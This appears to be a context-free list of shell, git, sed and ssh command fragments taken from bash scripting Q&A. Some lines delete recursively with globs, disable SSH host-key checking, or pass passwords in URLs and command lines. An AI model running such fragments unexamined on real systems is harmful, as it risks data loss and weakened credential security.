-I 'ab[XY]d'
/regex1/,/regex2/ d
man date
tail_ls() { ls -l "$1" | tail; }
multi-dimensional arrays
reading multiple lines
tail -10
du -scb /my/dir/*.gz|tail -n 1
stat -c '%s'
$(( ... 0 ))
... | bc
script_dir="$(dirname -- "$(readlink -f -- "$0")")"
grep -P
find . -type f -printf "%s\t%p\n" | sort -nr | head -n 100
[1] 12345
kill 12345
ps aux|grep sleep
kill %1
(while true;do sleep 99999;done)&
which sleep
ps -uf
> "$TMP"
> "$TMP"
cat "$TMP"
sed -i
mv input.tmp input
man 7 re_format
[: : integer expression expected
/dev/null/: Is a directory
echo "hello" 2>/dev/null/
( cd /var/www/config/ && ./deploy.sh )
( echo BEGIN ; sleep 3s ; echo END )
t1=$(date +%s%N)
help time
bash -x
man bash
| sed s/^0*//
man bash
man tr
man sed
time ls -l | sort | uniq
ls -l
echo "$foo"
echo "$foo"
-perm +111
-perm +111
-perm /111
-perm +111
mdfind 'kMDItemContentType=public.unix-executable'
find -L ...
find ...
-perm +111
-perm +111
-perm -111
find -L
-exec test -x {} \;
-exec test -x {} \;
-perm +111
-perm +111
-perm /111
find -L ...
find ...
-type f
man find
while IFS=$'\n' read -r var
script -qc progname > out.txt > 2>&1
wrapper.sh app.py
#! ../python
Unmatched ".
#! ../wrapper.sh
if [[ "$LIST" == *"$SOURCE"* ]]
grep /etc/mtab
> /dev/null
whitelist_from basheer@hydrofitgroup.com
declare -F
declare -F
compgen -A function
compgen -A [action]
man compgen
echo $PCOUNT
ps -a | grep show_volume.sh | wc -l
grep show_volume.sh
grep s[h]ow_volume.sh
ps -a
ps -ax
ps -e
source ...
grep -Fx
abc edg~~txt
sed 's/\./~~/g'
abc here~~is~~more~~dot-separated text
for fname in .*; do echo $fname; done;
ln -s A /var/www/root
ln -s /var/www/root A
ln -s /var/www/root A
alias e="emacs ."
e something.c
e "" foo.txt
vim /etc/somefile.conf
sudo !!
W10: Warning: Changing a readonly file
sudoedit /etc/somefile.conf
sudo mv
w !
sudo tee
sudo sh -c 'cat changed > file'
:call SaveAsSudo()<CR>
sudo tee
git gc
c:\Program Files (x86)\Git\etc\profile
Program Files (x86)
(git symbolic-ref -q HEAD || git rev-parse --short HEAD) 2> /dev/null
git status
git config core.preloadindex true
time git status
git config core.fscache true
time git status
git gc
git status
C:\Program Files\Git
Start in:%HOMEDRIVE%%HOMEPATH%
git status
git commit
C:\Program Files\Git\*
git status
ls -l
ls -l
git fetch --recurse-submodules -j8
git config --global submodule.fetchJobs 8
sleep 5
foo > >(bar)
if [ -f ~/.profile ]; then . ~/.profile; fi
if [ -f ~/.bashrc ]; then . ~/.bashrc; fi
-maxdepth 1
-type d
-printf '%P\n'
if [ $INFOLSGAME = 2 ]
svn log --xml
-l 50
--search ARG
svn log
svn log --search JohnDoe
while true; do cp file /other/location; sleep 5; done
cp from_file to_file &
./configure --prefix=/usr/gnu
sh -x xxx
tr -d '\r'
/usr/bin/expect^M: bad interpreter
:set list
rename .old '' *.old
find . -type d -exec rename .old '' {}/*.old \;
-type d
ls -ld
tree -L 2 -u -g -p -d
tar -czf file.tar.gz dirname &
do_something && do_something_else_that_depended_on_something
echo foo
echo foo
echo bar
echo foo
echo bar
command_1 && command_2
command_1 || command_2
if (condition_1 && condition_2){...}
if (condition_1 || condition_2){...}
mail -s ADDRESS
crontab -e
echo "Hello from Cron script"
set -e
: >foo.out
ptree $$
pstree -s $$
env -i
| tail +2
echo $SHLVL
git branch
==> **sqlplus username/password@instance @abc**
./noint ./y
shopt -s dotglob
find -exec
awk 'END{print ENVIRON["REF"]}' /dev/null
source "$HOME/.rvm/scripts/rvm"
trap INT
man sh
grep -F
grep -E
sort -u
grep -E '(firefox|chrome)'
/home/shara/Рабочий стол/testdir
path to me
find -inode
ls -al
-> /path/to/target/file
readlink -f
readlink -f
while ... done < <(find ...)
find ... | while ... done
find ... -type l
cat *.ext | awk 'BEGIN{i=0;} {i++;} END{print "Lines ", i}'
svnadmin hotcopy
(getenv "PATH")
echo $PATH
do shell script
0 - 255
head -1 logfile
$lines .= $_
push @lines, $_
+x *.php*
find ./ -iname "*.php*" -exec chmod 755 {} \;
#!/usr/bin/env perl
use strict;
use warnings;
rm -f
trap 0
exit 0
sed -i ...
sed -i .bak ...
if ! [[
[[ ]]
echo "f" > /dev/console ?
emailbackupstatus.sh&$backupName="Just testing"
$ ./script.sh foo bar mysubject
git nadd N
git add app/frontend/modules/file{1,3}
Rscript Graphs.R 10
Rscript Graphs.R --args 10
commandArgs(trailingOnly = FALSE)
bash args.sh
Rscript args.R 10
date +%s
date +%s
date +%s
wc -l "$resplogfile"| awk '{print $1'}
wc -l "$resplogfile"| awk '{print $1'}
echo "yes\yes\oops" | program
nohup some_command &
man nohup
info nohup
nohup something&
cat $eUsers | cut -d' ' -f2
cat /letter | mail -s "message" $name
ls -l
grep "current ->"
... == 1
shopt -s extglob
grep -Eq
"...not accessible: No such file or directory."
Image \(%N1{3}\).%le
sort -n
tail -1
cut -f2 -d" "
stat -c
-f "%m %N"
find . -type f
sed 's/.*/"&"/'
xargs ls -E
awk '{ print $6," ",$7 }'
awk '{ print $6," ",$7," ",$9 }'
tail -1
findlatest .
findlatest --exclude .git .
$( ... )
man git
IdentitiesOnly yes
git pull origin master
c:\Users\<your user>\.ssh\config
git clone
git clone git@github-work:company/project.git
git remote update
git pull
git clone
system("bash git.sh -i ~/.ssh/thatuserkey.pem pull")
-o IdentitiesOnly=yes
git fetch
git push
git pull
git clone
-o IdentitiesOnly=yes
git remote add origin
git clone
RSAAuthentication yes
Port xx
alias git-clone='GIT_SSH=ssh_wrapper git clone'
key1, key1.pub, key2, key2.pub
alias key1='cp ~/.ssh/key1 id_rsa && cp ~/.ssh/key1.pub id_rsa.pub'
alias key2='cp ~/.ssh/key2 id_rsa && cp ~/.ssh/key2.pub id_rsa.pub'
[remote "origin"]
git -c core.sshCommand="ssh -i ~/.ssh/<your_key>" clone git@github.com:<user>/<repo>.git
git config core.sshCommand 'ssh -i ~/.ssh/<your_key>'
git --git-dir=/path/to/repo/.git pull
ssh -vT git@github.com
fatal: Could not read from remote repository
git push
git pull
git clone
git fetch
git pull
git push
fopen("php://stdin", "r")
$fd = STDIN;
" "
bash --version
cp -r
cp -R $1/* $2/
shopt -s dotglob;
If you do a recursive copy and the source is a directory, then cp -T copies the content of the source into the destination, rather than copying the source itself.
cp: overwrite 'xx'?
rm *~
mv -b ...
cp -b ...
rm *~
make -p
return null
nameref A="A$J"
find ~ -name .svn | grep "a"
sed "s/ /\\\\ /g" list-of-files.txt
openssl dgst -md5 -binary
echo -n foo | openssl dgst -md5 -binary | openssl enc -base64
openssl md5
openssl dgst -md5
alias admin=pagsh -c "bash --rcfile myrc"
man bash
declare -r PROMPT_COMMAND="echo 'foobar'"
man 1 bash
man 1 zshexpn
setopt KSH_GLOB
cp *
find . -type f -not -path '*/exlude-path/*' -exec cp --parents '{}' '/destination/' \;
rsync -av --exclude 'sites/video' /var/www/html/ /var/www/dev
cp -rf -t destdir
cd /source_folder/ && find . -type d -not -path '*/not-from-here/*' -print -exec mkdir -p '/destination_folder/{}' \;
cd /source_folder/ && find . -type f -not -path '*/not-from-here/*' -print -exec cp -au '{}' '/destination_folder/{}' \;
mkdir -p
chmod +x
script.sh -rvx -f output_file.txt
-d $HOME
qdel {min..max}
qdel "$1"
echo qdel "$1"
tag0a.txt, tag1a.txt ,tag2a.txt and tag3a.txt
awk '{printf("%s,",$0)}' input.txt
awk 'BEGIN{ORS=","} {print $0}' input.txt
i='input.txt'; awk -v c=$(wc -l $i | cut -d' ' -f1) '{printf("%s",$0);if(NR<c){printf(",")}}' $i
awk '{printf("%s,",$0)}' input.txt | sed 's/,\s*$//'
python -c 'import sys; print(",".join(sys.stdin.read().splitlines()))'
ps aux
ssh-add -k
ssh -i ~/.ssh/id_dsa
string(substitute(expand("%:p"), 'script\.vim', '', 'g'))
set rtp
sudo su -
who am i | awk '{print $1}'
who -m
no login name
who am i
su user1
su user2
su user3
grep -o
source ~/.bash_profile
. ~/.bash_profile
. .bash_profile
. ~/.bash_profile
alias bashs="source ~/.bash_profile"
exec bash
source ~/.bash_profile
. ~/.bash_profile
bash -l
exec bash -l
./myscript.sh -Dvar=val
M-x eshell
M-x term
M-x shell
expect -v
expect version 5.43.0
expect eof
expect script
git commit
.\runcommand.bat LockManager releaseLock update_lock
./runcommand.sh LockManager releaseLock update_lock
my_exit = $?
man time
$ which time
until [$MY_VAR = 0]
MY_VAR = $(expr $MY_VAR - 1)
MY_VAR = ...
file11.csv, ..., file14.csv
<one> <> <three>
mv: rename Test.txt to DropBox/Test.txt: No such file or directory
mv $(find /home/balaji/work/ -type f -printf '%T+ %p\n' | sort | head -1) /home/balaji/regular_archieve
type -f
-printf ‘%T+ %p\n’
sort | head -n 1
source /home/hg/scripts/colors.sh
echo foo | bar
foo < <(bar)
-m 1
grep -f
rm -f corpus-lexicon.txt
ps -A
ps -A c
ps -o pid,tty,time,comm
set -o vi
mktemp -d
exit 1
mkdir -d
brew install coreutils
echo test
echo -ne "HTTP/1.0 200 OK\r\n\r\ntest"
man iconv
shopt -s globstar
shopt -s globstar
set -o globstar
shopt -s globstar
rm **/@(*.doc|*.pdf)
echo $(basename "$i")  # print the file name
echo ${i%/##*/}; # print the file name
readlink -f
echo $p | replace '//' ''
realpath -sm $p
script.sh LINES FILE1 FILE2 FILE3 >REPEAT_FILE
lsof -p $pid
echo $CMD
cat test
"cat test"
< "$FILE"
cat "$FILE" | while ...
xargs -n $NUMLINES mycommand
-n 2
man xargs
:set shellcmdflag=-ic
set shellcmdflag=-ic
:! cd folder/
:!bash -c ". ~/.alias; gitlog"
$ cp ~/.zshrc ~/.zshenv
man 5 terminfo
$> myrsh <hostname>
help while
CREATE PROCEDURE...END PROCEDURE
--before-context 1
grep -nE "^DB2[0-9]+" log.txt
cut -f 1 -d " "
gawk "/E$/{y=$0;print x, y};{x=$0}"
sed -e "s/:DB2[[:digit:]]\+[IE]//g"
gawk "{print \"sed -n \\\"\" $1+1 \",\" $2 \"p\\\" log.txt \"}"
sed -e "s/$/ >> filtered.txt/g"
>> filtered.txt
> run.bat
gawk '/E$/'
grep -a 2 "The SQL command completed successfully" mylog.log
$0 !~ /^$/
5[0-9][0-9] *)
return -1
set -u
set -u
grep error *log
grep error *log | grep foo
grep -a "some error message" *.log
grep -la "error.*foo" *.log
getent passwd
rotate-string string positions-to-rotate width fill-character
rotate-string abc -4 9 =
OUTPUT=$(ls -1)
read _
read ... dsk[6] dsk[2] dsk[9] ...
read _ disk[total] disk[used] ...
... read -u $list; ... {list}<inputfile
How to parse a CSV file in Bash?
sudo cmd | grep ... | cut ...
GNU bash, version 3.2.57(1)-release (arm64-apple-darwin21)
screen -S session1
[[ expr ]]
[ expr ]
test expr
test expr
{ }
cat my_file.txt
echo -e "Hello there, new line!" >> new_file.txt
cat <<EOF | sudo tee /etc/test.txt Hello World EOF
./xx.sh &
echo $abc
echo $USER
bash -c ...
[ ]
svn status
alias svns="/path/to/svn-color.py status"
#!/bin/awk -f
#! /bin/sh
#! /bin/awk -f
BEGIN {print "line of text"}
print ... >> file
awk -f
cat treatments.txt
cat simulations.txt
tail +n
head -n1
echo "i know about Pipes, girlfriend" > thatAnswer
zsh: file exists: thatAnswer
my_task &> 'Users/Name/Desktop/task_output.log'
set -o noclobber
set -o | grep noclobber
set -o noclobber
man mc
for i in *
apt-get install libxml2-utils
help readarray
help mapfile
cat var.txt | readarray -t input
LANG=C wget -O /dev/null --progress=bar:force:noscroll --limit-rate 5k http://nightly.altlinux.org/sisyphus/ChangeLog 2>&1 | stdbuf -i0 -o0 -e0 tr '>' '\n' | stdbuf -i0 -o0 -e0 sed -rn 's/^.*\<([0-9]+)%\[.*$/\1/p' | zenity --progress --auto-close
exit 0
return 0
function expand { for arg in "$@"; do [[ -f $arg ]] && echo $arg; done }
expand "$MYDIR/"*.$SUFFIXES
foo bar
"git --version"
git --version
git --version
CMD=<empty string> "git --version"
git --version
git --version
touch file
touch -r ref-file file
x y z
( )
[ ]
curl http://www.google.com | ./put_to_db.py
echo $address
echo ${addressarray[@]}
echo ${addressarray[0]}
for i in ${!addressarray[@]}; do echo ${addressarray[$i]}; done
$(echo foo$(echo bar))
$( ... )
`echo `foo``
rvm info
rvm use 1.9.2
inotifywait ... | while read ...; do ... done
fpassthru("ssh -i keyfile -l login name myserver.com dstat -a");
!($0 in a)
grep -Fxf
(!($0 in a))
uniq -u
tput setaf
read -r
for DEPTH in...
ls | replace
sed 'y/áí/ai/'
perl -CS -Mutf8 -pe 'y/áí/ai/'
echo -n $(command)
sed 's/------------/-/g'
[ ]
tr [foo] [bar]
ls | read ...
ls . | bash -c 'readarray i'
ls . | bash -c 'readarray i && for j in ${i[*]}; do <-command->; done'
rsync $NEWROW ...
~/a\ b\ c
NEWROW=$(echo $ROW | sed -e 's/ /\\ /g')
rails {c,s,g}
alias c=script/console
alias c="if [ -f script/console ]; then script/console; else script/rails console; fi"
String[] cmd = {"/full/absolute/path/to/love", "/Users/mtc06/testgame"};
read -t
COMP_WORDS, COMP_CWORD
read -ep
while read
[:         :]
man ed
man dd
man dd
man ed
rvm --default use 1.9.2
[[ -s "$HOME/.rvm/scripts/rvm" ]] && . "$HOME/.rvm/scripts/rvm"
scp doneill@server:/mnt/device/folder/numbered_file*
man java
printf -v
echo ${output[@]}
python manage.py syncdb
which expect
ls -l
source ./script.sh
source script.sh
git config --global core.editor 'mvim -f --nomru -c "au VimLeave * !open -a iTerm"'
<(sort file1)
sort file1
click it from a grafical interface
duplicated rows
check="/tmp/newdirectory"; [[ -n $(grep "^$check\$" my_list.txt) ]] && echo "dir already listed" || echo "$check" >> my_list.txt
grep .
ssh -tt myuser@myserver <<EOI
sudo su -
| bash
> file
| bash
touch 00000.png 00010.png 01010.png
[[ ]]
[[ -f ${i}_*.inp ]]
myutil "${arr[@]}"
(want user input pasted here)
- *
grep -ir parmX .bzr/
-printf '\0'
read -d $'\0'
set -x
set +x
( )
(( ))
< > == !=
[ ]
[ ]
-n 1
sed -i 's/\(\(\s\+\)log.debug(\)\(.*)\)/\1"\2" + \3/
\1"\2" + \3
"indentlevel" +
"indentlevel" +
log.debug("" + "foo")
man bash
-name "*.html"
Bash 4.x
shopt -s globstar
ln -s <path to target file/directory> <path to link>
setopt AUTO_PUSHD
autoload -U compinit; compinit
cd +
setopt PUSHD_MINUS
cd ~pep
cd pep
rev | tail -r
rev | tac
for((i=0;i<${#var};i++)); do rev="$rev${var:~i:1}"; done
c=$var; while [ "$c" ]; do rev=$rev${c#"${c%?}"}; c=${c%?}; done
grep -o "[0123456789]+"
dirname $0
SCRIPTPATH=`pwd` 
>/dev/null 2>&1
$( ... )
source ../../yourScript
source <name>
foo->dir1/dir2/bar bar->./../doe doe->script
find myfile.txt -mtime +5
man date
vim -o
ttyctl -f
... | xargs sh -c '...'
echo "$var" | command
printf "$var"
<<<"$var" my_cmd
grep -v -x -f f2 f1
-f f2
grep -F
sort f1 f2 | uniq -u
NR == FNR
awk '{if (f==1) { r[$0] } else if (! ($0 in r)) { print $0 } } ' f=1 exclude-these.txt f=2 from-this.txt
libpng error: Read Error
man sshpass
...If the string "-" is supplied as a filename, standard input is read instead...
exp <password> ssh <anything>
exp <password> scp <anysrc> <anydst>
-o StrictHostKeyChecking=no
'filename1','filename2'  ,'filename3' ....
chmod +x your_hook
echo something > foo.pipe
0 = 1
command arg1 arg1 ...
= 1
0: command not found
0=1: command not found
find ... -exec ... \; | ...
run "C:\path\to\file.exe" -- "some argument"
cmd /c
run "$command"
${var:+' '}
${var+' '}
find . -name "*$1*"
git add
shopt -s globstar
git add
git add
gadd something<tab>
sh -c
help shopt
xargs -n2
find printf
sed -z -e
:;recursive regex test;t
rm -rf ${UNNECESSARY}
\( -path PATTERN -exec rm -rf \{\} \)
_mvnfind "${@}"
mv -n $1 $2
read -R SED <<HEREDOC
find . -name ${OLD} -printf
%dir-depth :tab: 'mv '%path-to-${SRC}' '${sed_sep}'%path-again :null delimiter:'
sort -general-numerical -zero-delimited
sed -ex :rcrs;srch|(save${sep}*til)${OLD}|\saved${SUBSTNEW}|;til ${OLD=0}
sed -ex...-ex search|%dir_depth(save*)${sed_sep}|(only_saved)|out
getconf ARG_MAX
free -b
cat /proc/meminfo
`' "
cat -
zip -ur existing.zip myFolder
for filename in "/var/myfolder/*"
echo _ $filename _
app1.log app2.log
local x=("$@")
rm -rf *[!"${x[*]}"]
local x=("$@")
IFS=, rm -rf *[!"${x[*]}"]
rm -rf *[!a,b,c]
rm -rf *[!abc]
git ls-files
git rm
git add -A
== !=
&& ||
for ((i=0; i<=10; i++))
if ((true))
if ((true))
cat file.txt
[[ ]]
<( )
ls -F
head -n -5
xargs -r rm
tail -n-5
ls world*.zip | sort -r | tail n+5 | xargs rm
sort -r
tail n+5
xargs rm
svn move https://example.com/repos/123/* https://example.com/repos/
svn move foo\123\* foo\
alias g++='g++ -O3 -fopenmp'
tail -n 1
git ls-files
1770 files changed, 166776 insertions(+)
git ls-files | xargs wc -l
wc -l $(git ls-files)
wc -l $(git ls-files | grep '.*\.cs')
git ls-files | xargs cloc
brew install cloc
cloc $(git ls-files)
cloc .
git ls-files
cloc .
git ls-files | grep "\(.html\|.css\|.js\|.java\)$" | xargs wc -l
cloc --vcs=git
git grep --cached -al '' | xargs -P 4 cat | wc -l
git grep --cached -Il '' | xargs -P 4 cat | wc -l
git ls-files | xargs cat | awk '/\S/{x++} END{print "Total number of non-empty lines:", x}'
bar "$@"
bar "$1" "$2" "$3" "$4"
bash -c "bar \"$1\" \"$2\" \"$3\" \"$4\""
bash -c "bar $(printf -- '"%s" ' "$@")"
set --
"$1" "$2"
input_filename = $1
output_filename = $2
input_filename = 'chintz'
scalac -Xplugin:divbyzero.jar $REPORT
pc: Set(L, H)
$REPORT pc: Set(L, H)
stat -c '%a %n' /data
755 /data
chmod -R 755 /data/data/com.xxx.xxx
ls -ld /root/root/com.correct_ownership_app
drwxr-xr-x 14 root root 4096 2010-12-16 18:51 /var/
chown -R USER /data/data
| egrep -v '[0-9][0-9][0-9][0-9]:-[0-9][0-9][0-9][0-9]'
[[ ]]
c 0.5p_f
10 px 2
#!/usr/bin/env sh
asterisk as owner and group
mongo < yourFile.js
mongo myDbName test.js
mongo -host myReplicaset/anyKnownReplica
rvm ruby_with_all_gems ... do_something ... rvm back_to_other
alias capree="rvm with ree cap"
rvm exec ree cap
in elements
for variable
find .
-type d
-mindepth $n
man find
export PS1='$ '
sort -k 1,1 file.txt
sort -n
sort --numeric-sort
sort -n
sort -g
sort -n
sort -n -k1 filename
/<!-- this is token 1 -->/{
/<!-- this is token 2 -->/q
's/​/ /g'
's/ /\n/g'
set define on
file -ib <filename>
file <filename>
file <filename>
file -ib <filename>
file <filename>
-d " "
/<!-- this is token 1 -->/{
/<!-- this is token 2 -->/q
find /original -name '*.processme' -exec echo ln -s {} . \;
$(basename ...)
ls /home/mindon/bin/* | xargs ln -s -t /usr/local/bin/
(setsid <command> &)
[email] my commit message
sort -r -n
head -n 1
head -n"$1"
man bash
echo 'q'
EOF; break;;
001 file.ext
cp file.tar.gz ftp://username:password@host/file.tar.gz
if [[ ${step[x]} = "a]]"; then
(( ))
GNU sed
GNU sed
head -n -1
sed -i
sed -e '$ d' foo.txt
sed -i '' -e '$ d' foo.txt
head -n -1
tail -r
tail -n +2
sed -i
expr $a + 1
man grep
man 7 regex
man perlre
:help pattern
man bash
/Pathname Expansion<Enter>
info bash
script -host=aaa -user=bbb -pass=ccc
sh -x script
sh script
cat data.txt
"abc 123" 1 2 3 "how are you"
$ test.sh
; pwd
imageinfo --width --height
for f in *.txt; do echo "----------------<$f>----------------"; cat "$f"; done >> OUTPUT_FILE
*/1 * * * * /root/scripts/backupDB.sh
find -printf
-o listopt
Error: Expected 2 arguments, found only 1.
type -a <program>
s='a b c d e=x f g h i'
sudo sh -c 'echo $HOME'
export LD_LIBRARY_PATH=...
man dlopen
[ ]
[ -d "$destination" ]
awk '/connections/ {print $36}'
-p, --parents  no error if existing, make parent directories as needed
zenity --help-progress
<( command )
command1 <( command2 )
xinput list
ps aux
man bash
./myapp .... 2>/dev/null
--- usrn ---
--- userx ---
sh newuser.sh < usertable.txt > newusertable.txt
find . -type d
"Poor whiskers takes a tumble.\\nShe's fine..."
echo -n x && (echo 618cf954-6576-491d-8ac6-a1b888c4705d |xxd -r -p |openssl base64|tr '/+' '_-')
[[ "$x" == "$y" ]]
[[ -z "$x" ]]
stty sane
sort -nr
perl columnvalues.pl files*
set :deploy_to, '/bin/bash'
cat /var/log/messages
ssh myuser@myserver -c 'aptitude install bash --force'
sendmail -t
pgrep -c "$1"
grep -c
"AL" "AK" "AZ" "AR" "CA" "CO" ....
...."MP" "PR" "UM" "VI" "
vim $i/edit_
vim /www/productX/subdomain_x/cgi-bin/internal/edit_
shopt -u direxpand
shopt direxpand
shopt -s direxpand
sudo tee
<< "EOF"
sudo cat
find -inum
ls -i
$(printf "%02d" $day)
$(printf "%1d" $month)
s/ \+/ /g
date -d
date %s
1 year 1 day
sudo make install
-o vi
sort -k <your fields> | awk '{print $3, $1, $2}' | uniq -f2 -u | awk '{print $2, $3, $1}'
cut -f 1-5 -d ' '
mkdir $VIRTUAL_HOME/$VIRTUALENV/run
awk: illegal statement at source line 1
source /whatever/file
. /whatever/file
$? >> 8
git add /long/path/to/file
git status
git diff /long/path/to/changed/file
git add /long/path/to/changed/file
git diff
git add
alias r='fc -s'
git add .
kill -9
sh -c "your_command your_args"
while read
mount -t tmpfs none /new/path/for/temp -o size=32m
dd if=/dev/zero of=/new/path/for/temp/zero.txt bs=32m count=1
su -l nagios
sudo -u
The great theater
The\ great\ theater
wc -l hi.sh
fwrite($script, "\n");
wget --spider -r -l 1 http://myurl --output-file /tmp/httppipe
=~ m{^\-\-\d\d:\d\d:\d\d\-\-  http://$self->{http_server}:$self->{tcport}/(.*)$}, print $1
sudo node server
whereis node
node: /home/<my_user>/.nvm/versions/node/v8.9.4/bin/node
sudo ln -s /home/<my_user>/.nvm/versions/node/v8.9.4/bin/node /usr/bin/node
Not equal
Not equal
"$var1" = "$var2"
if [ "$var1"= "$var2" ]
[ expr ]
grep -Eo
$ sudo apt-get install python-lxml
--opt1=value1 --opt2=value2
$x date +m%
<manual input>
<manual input>
xml fo
find music  -type f  -exec bash -c 'ext="${0##*.}"; base="$(basename "$0" ."${ext}")"; dirs="$(dirname "$0" | cut -d '/' -f 2,3)"; new="newmusic/${dirs}/${base}.${ext}"; cp "$0" "${new}"' {} \;
find music/Artist -type d -maxdepth 0 -exec mv {} newmusic/ \;
cp -r
set +H
echo ${array[-1]}
mysql -uroot -e "SELECT blobcolumn INTO DUMPFILE '/tmp/file.zip' FROM table LIMIT 1" database
id -un
id -run
dos2unix foo.py
chmod +x script_name
(( anum++ ))
anum=$(($anum + 1))
while IFS=, read -r pid discard
sort -o
ls -lt mydirectory
git diff --no-index dir1/ dir2/
ls -R1 | egrep -C 0 "[^\.]+\.[^\./:]+$" | sed 's/.*\.//' | sort -u
ls -R | egrep  '(\.\w+)$' -o | sort | uniq -c | sort -r
find ./ -type f -name "*\.*" -printf "%f\n" | awk -F . '!seen[$NF]++ {print $NF}'
-type f
-name "*\.*"
-printf "%f\n"
-F .
print $NF
set -x
setopt xtrace
read -s -n3
history -s
read -e
history -s
eval fn$(cat status)
command grouping
blah foo bar
blahfoo bar
echo ${PATH} | grep <folder one wishes to add>
echo ${PATH} | grep /usr/local
man grep
grep -m 2
git grep
grep | sed 2q
git grep
git grep -m<max-hits>
git grep -m
git grep
-m <num>
--max-count <num>
sort -k1.5n
find $dir/* -type f
find $dir -type f
>> $OUT
while read
-maxdepth 1
sort --version-sort
echo -n "$(basename "$f") "
echo -n "${f##*/} "
set -x
set +x
set -x
trap debug
5461935212966259 + 1383718821564493249
set -x
set -x
set +x
set -x
set -x
set + 1 fork
set -x
set +x
sort -nrk7
bash -x
bash -lx
Permission Denied
ssh -v git@github.com
chmod 600 ~/.ssh/id_rsa*
for i in $(seq $n)
seq 1 1 $n
for ((i=1; i<=$n; i++))
cat file
$(cat file)
$(< file)
while read x
while IFS= read x
echo "$x"
eval "echo $x"
tar zxf /home/$USER/site/backups/$BACKUP_FILE -C /home/$USER/site/data/
tar -ztvf
read -p "Please enter"
set -x
cat > /dev/null
$include /etc/inputrc
read -i
ssh -N <somehost> &
kill jobs -p
jobs -p
alias endbash="./runscript;exit"
man bash
grep -v
crontab -l > somefile
crontab somefile
cat >'/path/to/remote' && chmod +x '/path/to/remote' && ...
sed -i
5.3 * 15
return 0
ps -efl | grep PORT_NUMBER
lsof -i tcp:${PORT_NUMBER}
awk 'NR!=1 {print $2}'
xargs kill
lsof -w -n -i tcp:8080
kill -9 processId
commands.getoutput("bash -c 'diff x  <(tail +2 y)'")
commands.getoutput('tail +2 y | diff x -')
100 / progbarlen
tput cols
maxwidth=$(tput cols)
for ((i=0; $i < $maxwidth; i++))
echo -en
bash -i
bash -i
"tests - Blub" "tests - Blub - Abc"
var=$(perl ...)
varArray=( $var )
varArray=( "tests - Blub" "tests - Blub - Abc" )
./prog <file>
array=(abc def ghi 123 456)
lib_progress_bar -c "@" -u "_" 0 100
getopts c:u:d:p:s:%:m: flag
set -x
exec("ssh username@server command -arg1 -arg2 ...");
$(__git_ps1 " (%s)")
echo "$r_m"
echo $1 | wrapped.py < /dev/stdin
$(( ))
if condition-command ; then list ; fi
while loops
[ ... ]
test ...
[[ ... ]]
(( ... ))
let ...
... ? ... : ...
info '(bash)Shell Arithmetic'
( ... )
{ ...; }
test 0 -eq 0
(( i > 0 ))
pidof plugin-container
sh script.sh /home/hss/* 4 gz
cd /home/user1
id > /tmp/id.$$
git commit -m ""
git commit -m $'Multi-line\ncommit\nmessage'
git commit --amend
git commit
C-x C-e
-m "text...
git commit -m 'Hello
git commit -m "Hello
git commit -m "Hello^
git commit -m 'Hello^
git log
git commit -e
git commit -m "<short_message>"
git commit --amend
git commit
sleep x
./initializeTest: line 250:  7566 Terminated ./$myprog
kill -0
sleep && kill
kill -s SIGTERM
wc -l
kill $PS
/g' ./infile
color_producing_script | cat
~/.emacs_SHELLNAME' exists, or
sed 's/;$//'
sed 's/;$//'
sed 's/.\{1\}$//'
head --bytes -1
head -c-1
head --bytes 10
head --bytes -10
killall xTrigger
history 1
# Display command ...
gnome-terminal 3.14
du -h | less
204640 6 du -h | 204641 6 less
cat <<"EOF" >titleWin.sh
chmod +x titleWin.sh
echo !!
Python, PHP, Perl, Shell script
man bash
'Operation not permitted'
git rev-parse HEAD
-load "cygwin"
chmod +x .git/hooks/post-commit
for f in *; do echo -n "$f " ; cat $f ; done
find . -type f -exec file {} \;
find . -type f -print0 | xargs -0 file
cat *
cat *.*
ls -l **/*.c
man 5 terminfo
set -Eeu
java -version
[[ ]]
[ ]
R --vanilla
cp /proc/$var1/fd/$var2 ~/$var3
< grep-result-test
cat grep-result-test.txt |
sed -r -n
-e " s%^.*$regex.*\$%\1 \2 \3%p "
read -a array
read var1 var2 var3
[[ ... ]]
[[ ... ]]
if read ; then ...
read && [[ $REPLY =~ $regex ]] && ...
help while
set -o noglob
cat *.input
find / -name "*.log" -a -type f -a -mtime -7 -exec sh -c "tail -10000 {} > fictmp; cat fictmp > {} ; rm fictmp" \;
export -f multiple_cmd
find *.txt -exec bash -c 'multiple_cmd "$0"' {} \;
-my file.html
-I {}
command | command | command
-exec …
; done
{print $0}
seq -w
seq -w 1 100
cut -d ' '
sed -e 's/ /\t/g'
printf ...
stdbuf -o0 printf ..
stdbuf -oL printf ...
cp /templates/apple /templates/used && cp /templates/apple /templates/inuse && rm /templates/apple
set -e
cp A B; rm A
mv A B
cp A B; mv A C
echo 1; echo 2; echo 3
set +H
I don't like it! Reverting again!
'I don'
't like it! Reverting again!'
git commit
chkconfig: 2345 90 60
chkconfig --list listofprocesses
alias mysql='/Applications/MAMP/Library/Bin/mysql
source ~/.bashrc
source .bashrc
source /etc/profile
alias hello="echo helloworld
gem install aka2
for image in *
'.*.js' -iname '*.js'
awk -F'$' '{ printf("%-80s$%s\n", $1, $2) }' params
alias slt=open -a "Sublime Text 2"
slt /regular/file
sudo slt /etc/hosts
git grep -h --cached ^ -- file 
i=$( i+1 )
$( foo )
$(( foo ))
sudo apt-get install timeout
sudo apt-get install coreutils
read -t 5 <>finished.pipe
run_with_timeout 3 sleep 10000
sleep 10000
read -t
run_with_timeout 2 sleep 2
run_with_timeout 0 sleep 0
apt-get --download-only install
apt-get install
/^[[:blank:]]*title[[:blank:]]*=[[:blank:]]*{/ {
/title *=/
s/} *$//p
title=$(sed -n ... )
{$1, $2, $3 ...}
$1 $2 $3 ...
set -x
bash -x
mysqldump --all-databases
1 1 * * * bash script.sh
1 1 * * * bash script.sh >> log
s/\(.*=\)\([a-z]\)/ \2/
let "k += 0.025"
let "$k += 0.025"
k += 0.025
puts @cmd
echo "123\b\b\b5" | sed 's/[\b]\{3\}//g'
ssh username@domain
ssh username@domain &
(ssh username@domain) &
(dothis.sh; thenthis.sh; andthislastthingtoo.sh) &
nohup ssh username@domain
ssh -o 'BatchMode=yes' username@domain
ssh -o 'BatchMode=yes' username@domain "while (( 1 == 1 )); do sleep 60; done"
pseudo terminal
ssh somewhere
netstat -tan | grep :22
netstat -tan | grep 192.168.1.31:22
ssh -M somewhere
ssh somewhere
netstat -tan | grep 192.168.1.31:22
sleep 86399
"<a href="""(.+)""">HTTP</a>"
"<a href="\""(.+)"\"">HTTP</a>"
'<a href="(.+)">HTTP</a>'
'<a href='\"'(.+)'\"'>HTTP</a>'
"<a href=(.+)>HTTP</a>"
gcloud preview app
-n1 -e
print --
